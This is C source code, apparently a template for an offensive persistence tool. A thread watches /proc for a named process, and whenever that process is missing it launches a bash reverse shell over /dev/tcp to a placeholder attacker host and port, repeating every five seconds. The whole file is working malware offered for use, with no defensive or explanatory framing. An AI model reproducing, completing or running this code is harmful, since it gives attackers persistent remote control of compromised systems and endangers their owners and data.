#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <dirent.h>
#include <sys/types.h>
/*
 * gcc -o monrev monrev.c -lpthread
 */
void *mon_shell(void *data) {
    while (1) {
        int process_found = 0;
        DIR *dir;
        struct dirent *entry;

        dir = opendir("/proc");
        if (dir == NULL) {
            perror("opendir");
            exit(EXIT_FAILURE);
        }

        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_DIR) {
                char path[256];
                snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);
                FILE *file = fopen(path, "r");
                if (file) {
                    char process_name[256];
                    if (fgets(process_name, sizeof(process_name), file) != NULL) {
                        process_name[strcspn(process_name, "\n")] = 0;
                        if (strcmp(process_name, "{line}") == 0) {
                            process_found = 1;
                            printf("Process '{line}' found (PID: %s)\n", entry->d_name);
                            break;
                        }
                    }
                    fclose(file);
                }
            }
        }
        closedir(dir);

        if (!process_found) {
            system("bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'");
            printf("Executing reverse shell!\n");
        }

        sleep(5);
    }
    return NULL;
}

int main() {
    pthread_t mon_thread;
    if (pthread_create(&mon_thread, NULL, mon_shell, NULL)) {
        fprintf(stderr, "Error creating thread\n");
        return 1;
    }

    printf("Monitoring started!\n");
    pthread_join(mon_thread, NULL);
    return 0;
}
